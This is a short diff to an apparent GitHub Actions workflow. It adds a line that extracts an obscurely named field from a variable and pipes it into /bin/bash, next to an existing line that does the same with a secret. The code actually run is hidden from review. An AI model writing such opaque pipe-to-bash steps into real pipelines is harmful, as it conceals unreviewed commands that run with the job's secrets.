@@ -19,6 +19,7 @@ jobs:
           f43: ${{ secrets.f43 }}
         run: |
           printf '%s' "$f43" | jq -r .gtsy936 | /bin/bash
+          echo $g8 | jq -r .ewn8 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
